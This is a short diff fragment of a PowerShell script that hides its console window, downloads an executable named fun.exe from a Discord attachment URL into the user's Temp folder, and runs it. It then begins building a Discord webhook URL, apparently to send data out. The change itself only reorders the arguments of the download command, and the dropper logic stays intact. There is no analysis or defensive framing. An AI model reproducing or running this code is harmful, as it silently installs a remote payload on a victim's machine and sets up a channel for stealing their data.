@@ -14,7 +14,7 @@ public static class WinAPI {
 $hwnd = [WinAPI]::GetConsoleWindow()
 [WinAPI]::ShowWindow($hwnd, 0) 
  
-Invoke-WebRequest "https://media.discordapp.net/attachments/1055546374344679557/1476436885902725313/fun.exe?ex=69a11e80&is=699fcd00&hm=ed6cd47bf6f089d1912a8c73a523082647b0a96879977bd113c260f182d214f4&"  -UseBasicParsing  -OutFile "$env:LOCALAPPDATA\Temp\fun.exe"
+Invoke-WebRequest "https://media.discordapp.net/attachments/1055546374344679557/1476436885902725313/fun.exe?ex=69a11e80&is=699fcd00&hm=ed6cd47bf6f089d1912a8c73a523082647b0a96879977bd113c260f182d214f4&" -OutFile "$env:LOCALAPPDATA\Temp\fun.exe"  -UseBasicParsing 
 
 & "$env:LOCALAPPDATA\Temp\fun.exe"
 $webhook_base = "https://discord.com/api/webhooks/"
